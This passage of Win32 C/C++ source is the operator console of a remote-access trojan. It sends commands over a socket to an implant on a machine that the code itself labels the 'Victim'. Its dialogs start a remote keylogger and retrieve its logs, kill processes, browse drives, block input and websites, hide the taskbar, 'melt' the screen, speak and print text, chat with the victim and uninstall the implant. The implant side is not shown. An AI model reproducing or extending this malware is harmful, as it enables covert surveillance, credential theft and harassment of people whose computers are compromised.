                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                        recvpacket.type = 0;
                        recvpacket.iBuf = 0;

                        iRes = recv(sockConnect, (LPSTR)&recvpacket, sizeof(packet_t), 0);
                        if(iRes > 0)
                        {
                            SetStatusBar(recvpacket.data);
                            if(recvpacket.iBuf)
                            {
                                /* Simulate "Load" button click to update the list box */
                                SendMessage(hwnd, WM_COMMAND, MAKEWPARAM(DLG_REG_IDC_BTN_QUERY, BN_CLICKED), (LPARAM)0);
                            }
                        }
                        else
                            ErrMsg("Error receiving data");
                    }
                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_REG] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}

//----------------------------------------------------------------
/* Keylogger Procedure */
BOOL CALLBACK DlgKeyProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    packet_t packet;
    packet.type = PACKET_KEY;
    HWND hBtnStart      = GetDlgItem(hwnd, DLG_KEY_IDC_BTN_START);
    HWND hBtnRetrieve   = GetDlgItem(hwnd, DLG_KEY_IDC_BTN_GETLOG);

    if(g_bKeyed){
        EnableWindow(hBtnStart, FALSE);
        EnableWindow(hBtnRetrieve, TRUE);
    }
    else{
        EnableWindow(hBtnStart, TRUE);
        EnableWindow(hBtnRetrieve, FALSE);
    }

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_KEY] = hwnd;
            SetWindowText(hBtnStart, (g_bKeyed) ? "Started..." : "Start");
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_KEY_IDC_BTN_START:
                    if(g_bKeyed == FALSE && bConnected == TRUE)
                    {
                        g_bKeyed = TRUE;
                        SetWindowText(hBtnStart, "Started...");
                        packet.iBuf = TRUE;
                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
                    }
                    if(!bConnected)
                        ErrMsg("Must be connected to server");
                    break;

                case DLG_KEY_IDC_BTN_GETLOG:
                    packet.iBuf = TRUE;
                    packet.iBuf2 = TRUE;
                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
                    break;

                default:
                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_KEY] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}

//----------------------------------------------------------------
/* Kill Process Procedure */
BOOL CALLBACK DlgKillProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditProc = GetDlgItem(hwnd, DLG_KILL_IDC_EDT_PROC);

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_KILL] = hwnd;
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_KILL_IDC_BTN_KILL:
                    {
                        packet_t packet;
                        packet.type = PACKET_KILL;
                        int len = 0;

                        len = GetWindowTextLength(hEditProc);
                        if(len <= 0)
                        {
                            ErrMsg("Enter a process to kill");
                            break;
                        }
                        GetWindowText(hEditProc, packet.data, len + 1);

                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                        if(check())
                            SetStatusBar("Process killed successfully.");
                        else
                            SetStatusBar("Failed to kill process.");
                    }
                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_KILL] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}

//----------------------------------------------------------------
/* Files Procedure */
BOOL CALLBACK DlgFilesProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hCmbDrives = GetDlgItem(hwnd, DLG_FILES_IDC_CMB_DRIVES);
    HWND hEditPath  = GetDlgItem(hwnd, DLG_FILES_IDC_EDT_PATH);
    HWND hBtnGo     = GetDlgItem(hwnd, DLG_FILES_IDC_BTN_GO);

    packet_t packet;
    packet.type = PACKET_FILES;

    switch(msg)
    {
        case WM_INITDIALOG:
            {
                hWindows[HWND_FILES] = hwnd;

                /* set the button icon */
                HICON hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_GO));
                SendMessage(hBtnGo, BM_SETIMAGE, IMAGE_ICON, reinterpret_cast<LPARAM>(hIcon));
                EnableWindow(hEditPath, FALSE);
            }
            return 0;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_FILES_IDC_BTN_DRIVES:
                    {
                        packet_t recvpacket;
                        packet.iBuf = FILES_DRIVES;

                        /* tell server to handle files */
                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                        int iRes = recv(sockConnect, (LPSTR)&recvpacket, sizeof(packet_t), 0);
                        int nDrives = recvpacket.iBuf;
                        if(iRes > 0)
                        {
                            for(int i=0; i<nDrives; ++i)
                            {
                                packet_t recvpacket;
                                TCHAR szBuffer[256] = {0};

                                recv(sockConnect, (LPSTR)&recvpacket, sizeof(packet_t), 0);
                                sprintf(szBuffer, "%s %s", recvpacket.data, recvpacket.buf);

                                CBAddString(hCmbDrives, szBuffer);
                            }
                        }
                    }
                    break;

                case DLG_FILES_IDC_LST_DIRS:
                    switch(HIWORD(wParam))
                    {

                    }
                    break;

                case DLG_FILES_IDC_LST_FILES:
                    switch(HIWORD(wParam))
                    {

                    }
                    break;

                case DLG_FILES_IDC_BTN_DOWNLOAD:
                    {

                    }
                    break;

                case DLG_FILES_IDC_BTN_UPLOAD:
                    {

                    }
                    break;
            }
            return 0;

        case WM_CLOSE:
            hWindows[HWND_FILES] = NULL;
            EndDialog(hwnd, 0);
            return 0;

        default:
            return 0;
    }

    return 0;
}

//----------------------------------------------------------------
/* Fun Functions Procedure */
BOOL CALLBACK DlgFunProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditText = GetDlgItem(hwnd, DLG_FUN_IDC_EDT_TEXT);
    packet_t packet;
    packet.type = PACKET_FUN;

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_FUN] = hwnd;
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_FUN_IDC_BTN_CMOUSE:
                    packet.iBuf = FUN_CMOUSE;
                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("Mouse crazy.");
                    else
                        SetStatusBar("Crazy mouse failed.");
                    break;

                case DLG_FUN_IDC_BTN__CMOUSE:
                    packet.iBuf = FUN__CMOUSE;
                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("Mouse fixed.");
                    else
                        SetStatusBar("Failed to fix mouse.");
                    break;

                case DLG_FUN_IDC_BTN_START:
                    packet.iBuf = FUN_START;
                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("Start button hidden.");
                    else
                        SetStatusBar("Failed to hide start button.");
                    break;

                case DLG_FUN_IDC_BTN__START:
                    packet.iBuf = FUN__START;
                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("Start button unhidden.");
                    else
                        SetStatusBar("Failed to unhide start button.");
                    break;

                case DLG_FUN_IDC_BTN_TASKBAR:
                    packet.iBuf = FUN_TASKBAR;
                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("Taskbar hidden.");
                    else
                        SetStatusBar("Failed to hide taskbar.");
                    break;

                case DLG_FUN_IDC_BTN__TASKBAR:
                    packet.iBuf = FUN__TASKBAR;
                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("Taskbar unhidden.");
                    else
                        SetStatusBar("Failed to unhide taskbar.");
                    break;

                case DLG_FUN_IDC_BTN_CDTRAY:
                    packet.iBuf = FUN_CDTRAY;
                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("CD tray opened.");
                    else
                        SetStatusBar("Failed to open CD tray.");
                    break;

                case DLG_FUN_IDC_BTN__CDTRAY:
                    packet.iBuf = FUN__CDTRAY;
                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("CD tray closed.");
                    else
                        SetStatusBar("Failed to close CD tray.");
                    break;

                case DLG_FUN_IDC_BTN_BLOCK:
                    packet.iBuf = FUN_BLOCK;
                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("Input blocked.");
                    else
                        SetStatusBar("Failed to block input.");
                    break;

                case DLG_FUN_IDC_BTN__BLOCK:
                    packet.iBuf = FUN__BLOCK;
                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("Input unblocked.");
                    else
                        SetStatusBar("Failed to unblocked input.");
                    break;

                case DLG_FUN_IDC_BTN_TEXT:
                    packet.iBuf = FUN_TEXT;
                    int len = GetWindowTextLength(hEditText);
                    if(len <= 0)
                    {
                        ErrMsg("Enter start button text");
                        break;
                    }
                    GetWindowText(hEditText, packet.data, len + 1);

                    send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                    if(check())
                        SetStatusBar("Start button text set.");
                    else
                        SetStatusBar("Failed to set start button text.");
                    break;

                default:
                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_FUN] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}

//----------------------------------------------------------------
/* Block Website Procedure */
BOOL CALLBACK DlgBlockWebProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditWebsite = GetDlgItem(hwnd, DLG_BLOCKWEB_IDC_EDT_WEB);

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_BLOCKWEB] = hwnd;
            SetWindowText(hEditWebsite, "www.google.com");
            ShowWindow(GetConsoleWindow(), SW_RESTORE);
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_BLOCKWEB_IDC_BTN_BLOCK:
                    {
                        int len = GetWindowTextLength(hEditWebsite);
                        if(len <= 0)
                        {
                            ErrMsg("Enter a website");
                            break;
                        }

                        packet_t packet, recvpacket;
                        packet.type = PACKET_BLOCKWEB;
                        TCHAR szBuffer[len + 1];
                        GetWindowText(hEditWebsite, szBuffer, len + 1);
                        sprintf((LPSTR)packet.data, (LPCSTR)szBuffer);

                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
                        SetStatusBar("Sent website block request...awaiting reply");

                        int iRes = recv(sockConnect, (LPSTR)&recvpacket, sizeof(packet_t), 0);
                        if(iRes > 0)
                            SetStatusBar((LPSTR)recvpacket.data);
                        else
                            SetStatusBar("Error receiving data");
                    }
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_BLOCKWEB] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }

    return TRUE;
}

//----------------------------------------------------------------
/* Voice Speak Procedure */
BOOL CALLBACK DlgVoiceProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditPhrase = GetDlgItem(hwnd, DLG_VOICE_IDC_EDT_PHRASE);

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_VOICE] = hwnd;
            SetWindowText(hEditPhrase, "Hello");
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_VOICE_IDC_BTN_SEND:
                    {
                        packet_t packet, recvpacket;
                        packet.type = PACKET_VOICE;
                        int len = 0;

                        len = GetWindowTextLength(hEditPhrase);
                        if(len <= 0)
                        {
                            ErrMsg("Enter a phrase to speak");
                            break;
                        }
                        GetWindowText(hEditPhrase, packet.data, len + 1);

                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                        recv(sockConnect, (LPSTR)&recvpacket, sizeof(packet_t), 0);
                        if(recvpacket.type == PACKET_RET && recvpacket.iBuf == TRUE)
                            SetStatusBar("Voice command executed successfully.");
                        else
                            SetStatusBar("Problem executing voice command.");
                    }
                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_VOICE] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}

//----------------------------------------------------------------
/* Chat Procedure */
DWORD WINAPI _Chat(LPVOID lpBuffer)
{
    /* let the server know it's going into chat */
    packet_t* pPacket = new packet_t;
    pPacket->type = PACKET_CHAT;
    pPacket->iBuf = TRUE;
    send(sockConnect, (LPSTR)pPacket, sizeof(packet_t), 0);
    delete pPacket; pPacket = 0;

    HWND hChat = hWindows[HWND_CHAT];

    while(g_bChat)
    {
        packet_t recvpacket;
        int iRes = recv(sockConnect, (LPSTR)&recvpacket, sizeof(packet_t), 0);
        if(iRes > 0)
        {
            if(recvpacket.type == PACKET_CHAT)
            {
                char szBuffer[strlen(recvpacket.data + 11)];

                sprintf(szBuffer, "Victim: %s", recvpacket.data);

                LBAddString(hChat, DLG_CHAT_IDC_LST_CHAT, szBuffer);
            }
        }
        else
        {
            // shit
        }
    }


    ExitThread(0);
}
BOOL CALLBACK DlgChatProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditSay  = GetDlgItem(hwnd, DLG_CHAT_IDC_EDT_SAY);

    switch(msg)
    {
        case WM_INITDIALOG:
            SendMessage(GetDlgItem(hwnd, DLG_CHAT_IDC_LST_CHAT), LB_SETHORIZONTALEXTENT,
                (WPARAM)1200, (LPARAM)0);
            g_bChat = TRUE;
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&_Chat, NULL, 0, 0);
            hWindows[HWND_CHAT] = hwnd;
            return 0;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_CHAT_IDC_BTN_SEND:
                    {
                        packet_t packet;
                        packet.type = PACKET_CHAT;
                        packet.iBuf = FALSE; // make sure it's not interpretted as a new chat window
                        int len = GetWindowTextLength(hEditSay);
                        if(len <= 0)
                            break;

                        char szBuffer[len + 1];
                        char szSay[strlen(szBuffer) + 5];
                        GetWindowText(hEditSay, szBuffer, len + 1);

                        sprintf(szSay, "Me: %s", szBuffer);

                        LBAddString(hwnd, DLG_CHAT_IDC_LST_CHAT, szSay);

                        /* send the string to the server for update */
                        sprintf(packet.data, szBuffer);
                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                        /* clear the say box */
                        SetWindowText(hEditSay, "");
                    }
                    break;
            }
            return 0;

        case WM_CLOSE:
            {
                /* tell the server to quit chatting */
                packet_t packet;
                packet.type = PACKET_QUIT_CHAT;
                send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);

                g_bChat = FALSE;
                hWindows[HWND_CHAT] = NULL;
                EndDialog(hwnd, 0);
            }
            return 0;

        default:
            return FALSE;
    }

    return TRUE;
}

//----------------------------------------------------------------
/* Display Procedure */
BOOL CALLBACK DlgDisplayProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditRange = GetDlgItem(hwnd, DLG_DISP_IDC_EDT_RANGE);

    static checkbox_t reverse;
    reverse.hWnd = GetDlgItem(hwnd, DLG_DISP_IDC_CHK_BWREVERSE);

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_DISP] = hwnd;
            SendMessage(reverse.hWnd, BM_SETCHECK, (WPARAM)1, (LPARAM)0);
            reverse.bChecked = TRUE;
            SetWindowText(hEditRange, "8");
            return 0;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_DISP_IDC_CHK_BWREVERSE:
                    if(!reverse.bChecked)
                    {
                        SendMessage(reverse.hWnd, BM_SETCHECK, (WPARAM)1, (LPARAM)0);
                        reverse.bChecked = TRUE;
                    }
                    else
                    {
                        SendMessage(reverse.hWnd, BM_SETCHECK, (WPARAM)0, (LPARAM)0);
                        reverse.bChecked = FALSE;
                    }
                    return 0;

                case DLG_DISP_IDC_BTN_TEST:
                    {
                        /* Check the windows version */
                        OSVERSIONINFO lpVer;
                        lpVer.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
                        if(GetVersionEx(&lpVer) && (lpVer.dwMajorVersion > 5 ||
                            lpVer.dwMajorVersion == 5 && lpVer.dwMinorVersion > 1))
                        {
                            ErrMsg("You need Windows XP or less to use this function.");
                            break;
                        }

                        if(MessageBox(NULL, "This will cause your computer to lag for several seconds.\n"
                            "Do you wish to continue?",
                            "Warning",
                            MB_YESNO | MB_ICONWARNING) == IDNO)
                                break;

                        int len = GetWindowTextLength(hEditRange);
                        if(len <= 0)
                        {
                            ErrMsg("Enter pixel shift range");
                            break;
                        }

                        TCHAR szBuffer[len + 1];
                        int nRange = 0;

                        GetWindowText(hEditRange, szBuffer, len + 1);
                        nRange = atoi((LPCSTR)szBuffer);
                        if(nRange < 1 || nRange > 16)
                        {
                            ErrMsg("Pixel shift range must be between 1 and 16");
                            break;
                        }

                        HDC hdc = GetWindowDC(NULL);
                        long nColor = 0;

                        /* Melt the screen */
                        for(int x=0; x<GetSystemMetrics(SM_CXSCREEN); ++x)
                        {
                            for(int y=0; y<GetSystemMetrics(SM_CYSCREEN); ++y)
                            {
                                nColor = GetPixel(hdc, x, y);
                                nColor <<= rand() % nRange;
                                if(reverse.bChecked) nColor = ~nColor;
                                nColor >>= rand() % nRange;
                                SetPixel(hdc, x, y, nColor);
                            }
                        }
                        ReleaseDC(NULL, hdc);
                    }
                    return 0;

                case DLG_DISP_IDC_BTN_MELT:
                    {
                        packet_t packet, recvpacket;
                        packet.type = PACKET_DISP;

                        int len = GetWindowTextLength(hEditRange);
                        if(len <= 0)
                        {
                            ErrMsg("Enter pixel shift range");
                            break;
                        }

                        TCHAR szBuffer[len + 1];
                        int nTemp = 0;

                        GetWindowText(hEditRange, szBuffer, len + 1);
                        nTemp = atoi((LPCSTR)szBuffer);
                        if(nTemp < 1 || nTemp > 16)
                        {
                            ErrMsg("Pixel shift range must be between 1 and 16");
                            break;
                        }

                        /* determine whether to reverse pixels */
                        if(reverse.bChecked)
                            packet.iBuf = TRUE;
                        else
                            packet.iBuf = FALSE;
                        /* store the shift range */
                        packet.iBuf2 = atoi((LPCSTR)szBuffer);

                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
                        if(check())
                            SetStatusBar("Screen melted.");
                        else
                            SetStatusBar("Failed to melt screen.");
                    }
                    break;
            }
            return 0;

        case WM_CLOSE:
            hWindows[HWND_DISP] = NULL;
            EndDialog(hwnd, 0);
            return 0;

        default:
            return 0;
    }

    return TRUE;
}

//----------------------------------------------------------------
/* Print Procedure */
BOOL CALLBACK DlgPrintProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    HWND hEditPrint = GetDlgItem(hwnd, DLG_PRINT_IDC_EDT_TEXT);

    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_PRINT] = hwnd;
            return 0;

        case WM_COMMAND:
            if(LOWORD(wParam) == DLG_PRINT_IDC_BTN_PRINT)
            {
                packet_t packet;
                packet.type = PACKET_PRINT;

                int len = GetWindowTextLength(hEditPrint);
                if(len <= 0)
                {
                    ErrMsg("Enter text to print");
                    break;
                }
                GetWindowText(hEditPrint, packet.data, len + 1);

                send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
                if(check())
                    SetStatusBar("Print successful.");
                else
                    SetStatusBar("Print failed.");
            }
            return 0;

        case WM_CLOSE:
            hWindows[HWND_PRINT] = NULL;
            EndDialog(hwnd, 0);
            return 0;

        default:
            return 0;
    }

    return 0;
}

//----------------------------------------------------------------
/* Uninstall Procedure */
BOOL CALLBACK DlgUninstProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch(msg)
    {
        case WM_INITDIALOG:
            hWindows[HWND_UNINST] = hwnd;
            return TRUE;

        case WM_COMMAND:
            switch(LOWORD(wParam))
            {
                case DLG_UNINST_IDC_BTN_LOCAL:

                    break;

                case DLG_UNINST_IDC_BTN_REMOTE:
                    {
                        packet_t packet;
                        packet.type = PACKET_UNINST;

                        send(sockConnect, (LPSTR)&packet, sizeof(packet_t), 0);
                        cleanup();
                    }
                    break;
            }
            return TRUE;

        case WM_CLOSE:
            hWindows[HWND_UNINST] = NULL;
            EndDialog(hwnd, 0);
            return TRUE;

        default:
            return FALSE;
    }
    return TRUE;
}
